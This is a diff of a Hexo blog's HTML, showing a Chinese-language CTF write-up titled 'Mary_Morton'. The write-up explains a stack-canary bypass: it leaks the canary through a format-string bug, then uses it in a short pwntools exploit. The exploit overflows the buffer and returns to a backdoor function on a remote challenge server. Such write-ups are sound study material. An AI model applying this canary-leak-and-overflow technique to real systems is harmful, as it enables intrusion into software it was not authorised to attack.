@@ -6,17 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2020 | Hexo</title>
+  <title>Mary_Morton | Hexo</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/archives/2020/index.html">
+  <meta name="description" content="Mary_Morton一个最基础的canray绕过题目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mary_Morton">
+<meta property="og:url" content="http://yoursite.com/2020/03/20/Mary_Morton/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Mary_Morton一个最基础的canray绕过题目">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/03/20/Mary_Morton/image-20200319231019546.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/20/Mary_Morton/image-20200319231159994.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/20/Mary_Morton/image-20200319231555963.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/20/Mary_Morton/image-20200319231841220.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/20/Mary_Morton/image-20200319232802204.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/20/Mary_Morton/image-20200320003312764.png">
+<meta property="article:published_time" content="2020-03-20T03:21:16.077Z">
+<meta property="article:modified_time" content="2020-03-20T03:24:38.310Z">
 <meta property="article:author" content="Chenqiw">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/20/Mary_Morton/image-20200319231019546.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -183,278 +194,215 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-Mary_Morton" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+    <h1 class="article-title" itemprop="name">
+      Mary_Morton
+    </h1>
+  
+
+
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
 <a href="/2020/03/20/Mary_Morton/" class="archive-article-date">
         <time datetime="2020-03-20T03:21:16.077Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-20</time>
 </a>
 
-        </div>
-    	 
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/03/20/Mary_Morton/" target="_blank">Mary_Morton</a>
   
-    </h1>
-  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">496字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">1分</span>
+    </span>
+  </span>
+</div>
 
 
-        <div class="article-info info-on-right">
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h1><p>一个最基础的canray绕过题目  </p>
+<a id="more"></a> 
+
+<p><img src="/2020/03/20/Mary_Morton/image-20200319231019546.png" alt="image-20200319231019546"></p>
+<p>64位程序，运行一下  </p>
+<p><img src="/2020/03/20/Mary_Morton/image-20200319231159994.png" alt="image-20200319231159994"></p>
+<p>让我们进行选择，打开IDA查看一下 </p>
+<p><img src="/2020/03/20/Mary_Morton/image-20200319231555963.png" alt="image-20200319231555963"></p>
+<p>如果选择了2，我们将进入一个函数，再这个函数中我们可以看到一个格式化字符串漏洞 </p>
+<p><img src="/2020/03/20/Mary_Morton/image-20200319231841220.png" alt="image-20200319231841220"></p>
+<p>然后再次进行选择，这次选择1，我们将会进入另外一个函数 在这个函数中我们也看到了一个危险的read函数，但是因为开启了栈保护，所以不能直接进行栈溢出，等等，前面不是有个格式化字符串漏洞么，我觉得可以利用一下，这里需要了解一下canary保护的机制，这个概念应用在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的canary值，栈帧销毁前测试该值是否“死掉”，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。 那么是不是只要知道canary值的地址和他的值，在溢出的时候使他保持不变，就可以完美的骗过他，从而达到我们的目的，</p>
+<p>在程序中我们看到了这个程序的后门 </p>
+<p><img src="/2020/03/20/Mary_Morton/image-20200319232802204.png" alt="image-20200319232802204"></p>
+<p>好的，现在的主要问题就是如何找到canary的值和他的地址，通过观察发现canary就是V2，而buf和V2在两个函数中的位置一样，这就验证了我们可以通过printf得到canary的值，我们计算一下偏移 </p>
+<p><img src="/2020/03/20/Mary_Morton/image-20200320003312764.png" alt="image-20200320003312764"></p>
+<p>偏移为6，那么canary的偏移就是(0x90-8)/8+6=23,好的，  现 我 就可以通过%23$p来得到canary的值了  </p>
+<p>好啦现在可以直接写exp了 </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>, arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="number">35506</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Exit the battle '</span>,str(<span class="number">2</span>))</span><br><span class="line">p.sendline(<span class="string">'%23$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary = int(p.recvuntil(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Exit the battle '</span>,str(<span class="number">1</span>))</span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">"A"</span> + p64(canary) + <span class="number">8</span>*<span class="string">"A"</span> + p64(<span class="number">0x4008DA</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>​                          </p>
+
+    
+
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          Chenqiw
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="http://yoursite.com/2020/03/20/Mary_Morton/" title="Mary_Morton" target="_blank">http://yoursite.com/2020/03/20/Mary_Morton/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
-          
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
 
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/03/20/Mary_Morton/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/03/19/string/" class="archive-article-date">
-        <time datetime="2020-03-19T03:08:02.172Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-19</time>
-</a>
 
+
+<nav id="article-nav">
+  
+  
+    <a href="/2020/03/19/string/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">string</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/03/19/string/" target="_blank">string</a>
-  
-    </h1>
-  
+        
+        
+    </div>
+</aside>
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/03/18/cgpwn3/" class="archive-article-date">
-        <time datetime="2020-03-18T14:51:29.766Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-18</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/03/18/cgpwn3/" target="_blank">cgpwn3</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/03/15/guess_num/" class="archive-article-date">
-        <time datetime="2020-03-15T13:10:17.524Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-15</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/03/15/guess_num/" target="_blank">guess_num</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/03/14/xctf-hello_pwn%20%E9%A2%98%E8%A7%A3/" class="archive-article-date">
-        <time datetime="2020-03-14T07:17:02.400Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-14</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/03/14/xctf-hello_pwn%20%E9%A2%98%E8%A7%A3/" target="_blank">xctf-hello_pwn 题解</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/03/12/ctf-when_did_you_born/" class="archive-article-date">
-        <time datetime="2020-03-12T12:26:17.167Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-12</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/03/12/ctf-when_did_you_born/" target="_blank">ctf-when_did_you_born</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/03/12/ctf-CGfsb/" class="archive-article-date">
-        <time datetime="2020-03-12T10:25:33.244Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-12</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/03/12/ctf-CGfsb/" target="_blank">ctf-CGfsb</a>
-  
-    </h1>
-  
 
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2020/02/11/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/" class="archive-article-date">
-        <time datetime="2020-02-11T13:18:33.692Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-11</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2020/02/11/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/" target="_blank">关于博客主题</a>
-  
-    </h1>
-  
-
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -495,8 +443,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: true,
